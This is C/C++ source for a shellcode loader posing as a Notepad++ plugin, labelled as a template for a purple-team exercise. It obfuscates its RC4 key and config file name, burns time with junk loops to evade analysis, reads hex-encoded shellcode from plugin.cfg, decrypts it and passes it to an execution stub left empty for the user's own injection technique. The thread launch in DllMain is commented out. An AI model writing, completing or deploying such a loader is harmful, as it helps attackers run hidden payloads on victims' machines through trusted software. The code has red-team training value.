// @BorjaMerino: shellcode loader template (Purple exercise)
#include "PluginDefinition.h"
#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include "PluginDefinition.h"
#include "menuCmdID.h"

#define MAX_LENGTH 4000
#define MAX_HEX_LEN 4000

unsigned char rc4key[] =
{
	//Alp1n32023
	0x51, 0x40, 0x1d, 0x1e, 0x9f, 0xac, 0xee, 0xde,
	0x62, 0xa1, 0xa0
};

unsigned char filename[] =
{
	//plugin.cfg
	0x25, 0x16, 0xa1, 0x97, 0x95, 0x11, 0x30, 0x95,
	0x12, 0x91, 0x23
};

bool isHex(const char* str) {
	for (int i = 0; i < strlen(str); i++) {
		if (!((str[i] >= '0' && str[i] <= '9') || (str[i] >= 'A' && str[i] <= 'F') || (str[i] >= 'a' && str[i] <= 'f'))) {
			return false;
		}
	}
	return true;
}

void hex_to_bytes(char* hex_str, unsigned char* bytes) {
	for (int i = 0; i < strlen(hex_str); i += 2) {
		sscanf(hex_str + i, "%2hhx", &bytes[i / 2]);
	}
}

int delay_code()
{
	// Junk code to delay execution
	srand(time(NULL));
	int it = (rand() % 9000000) + 1000000000; // Change me
	double del = 0;
	for (int i = 0; i < it; i++) {
		del += pow(-1, i) * 4.0 / (2 * i + 1);
	}

	return (int)del;

}

void rc4_init(unsigned char* s, unsigned char* key, int key_len) {
	for (int i = 0; i < 256; i++) {
		s[i] = i;
	}

	int j = 0;
	for (int i = 0; i < 256; i++) {
		j = (j + s[i] + key[i % key_len]) % 256;
		unsigned char temp = s[i];
		s[i] = s[j];
		s[j] = temp;
	}
}

void rc4_crypt(unsigned char* s, unsigned char* data, int data_len, unsigned char* out) {
	int i = 0, j = 0;
	for (int k = 0; k < data_len; k++) {
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		unsigned char temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		out[k] = data[k] ^ s[(s[i] + s[j]) % 256];
	}
}

void get_filename()
{
	for (unsigned int m = 0; m < sizeof(filename); ++m)
	{
		unsigned char c = filename[m];
		c += m;
		c = (c >> 0x7) | (c << 0x1);
		c -= 0x8b;
		c = -c;
		c ^= 0x31;
		filename[m] = c;
	}
}

void get_rc4()
{
	for (unsigned int m = 0; m < sizeof(rc4key); ++m)
	{
		unsigned char c = rc4key[m];
		c ^= 0x33;
		c += 0x50;
		c = -c;
		c = ~c;
		c ^= m;
		c = (c >> 0x7) | (c << 0x1);
		c = ~c;
		c -= m;
		c = (c >> 0x7) | (c << 0x1);
		c -= m;
		c = (c >> 0x2) | (c << 0x6);
		c -= 0x24;
		c = -c;
		c += 0xa3;
		c ^= 0x34;
		c += 0x3c;
		c ^= 0xfd;
		c += 0x7e;
		c = ~c;
		c -= 0xcc;
		rc4key[m] = c;
	}
}

void clear_mem(unsigned char* data) {
	int len = strlen((char*)(data));
	memset(data, 0, len);
}

void pushret(LPVOID lpMapAddress) {
	__asm
	{
		mov eax, lpMapAddress
		push eax;
		ret
	}
}
extern FuncItem funcItem[nbFunc];
extern NppData nppData;

void allocation_run(unsigned char* payload) {
	/*Make your magic: callbacks/direct syscalls, patching, Phantom DLL, ... */
}


DWORD WINAPI funny(LPVOID lpParameter) {

	//clock_t start_time = clock();
	int junk = delay_code();
	//clock_t end_time = clock();
	//double time_elapsed = (double)(end_time - start_time) / CLOCKS_PER_SEC;
	//printf("Time: %f seconds \n", time_elapsed);

	char line[MAX_LENGTH];
	char hex_values[MAX_LENGTH * 30];// <-- Change me
	strcpy(hex_values, "");

	get_filename();
	FILE* config_file = fopen((const char*)filename, "r");
	clear_mem(filename);

	if (config_file == NULL) {
		int msgboxID = MessageBox(
			NULL,
			(LPCWSTR)L"no file found",
			(LPCWSTR)L"Account Details",
			MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
		);
		return junk;
	}

	while (fgets(line, MAX_LENGTH, config_file) != NULL) {
		char* equal_sign = strchr(line, '=');
		if (equal_sign == NULL) {
			continue;
		}

		char* value = equal_sign + 1;
		value = strtok(value, " \n");

		if (!isHex(value)) {
			continue;
		}

		strcat(hex_values, value);
	}
	fclose(config_file);

	unsigned char bytes[MAX_HEX_LEN];
	hex_to_bytes(hex_values, bytes);

	unsigned char s[256];
	get_rc4();
	rc4_init(s, (unsigned char*)rc4key, strlen((const char*)rc4key));
	clear_mem(rc4key);
	unsigned char out[MAX_HEX_LEN / 2];
	rc4_crypt(s, bytes, MAX_HEX_LEN / 2, out);

	unsigned char payload[MAX_HEX_LEN];
	hex_to_bytes((char*)out, payload);
	allocation_run(payload);

	return 0;
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  reasonForCall, LPVOID /*lpReserved*/)
{
	try {

		switch (reasonForCall)
		{
		case DLL_PROCESS_ATTACH:
			//HANDLE threadHandle;
			//DWORD threadId;
			//threadHandle = CreateThread(NULL, 0, funny, NULL, 0, &threadId);
			//break;

		case DLL_PROCESS_DETACH:
			break;

		case DLL_THREAD_ATTACH:
			break;

		case DLL_THREAD_DETACH:
			break;
		}
	}
	catch (...) { return FALSE; }

	return TRUE;
}


extern "C" __declspec(dllexport) void setInfo(NppData notpadPlusData)
{
	return;
}

extern "C" __declspec(dllexport) const TCHAR * getName()
{
	return NPP_PLUGIN_NAME;
}

extern "C" __declspec(dllexport) FuncItem * getFuncsArray(int* nbF)
{
	*nbF = nbFunc;
	return funcItem;
}


extern "C" __declspec(dllexport) void beNotified(SCNotification * notifyCode)
{
	switch (notifyCode->nmhdr.code)
	{
	case NPPN_SHUTDOWN:
		return;

	default:
		return;
	}
}

extern "C" __declspec(dllexport) LRESULT messageProc(UINT /*Message*/, WPARAM /*wParam*/, LPARAM /*lParam*/)
{
	return TRUE;
}

#ifdef UNICODE
extern "C" __declspec(dllexport) BOOL isUnicode()
{
	return TRUE;
}
#endif 
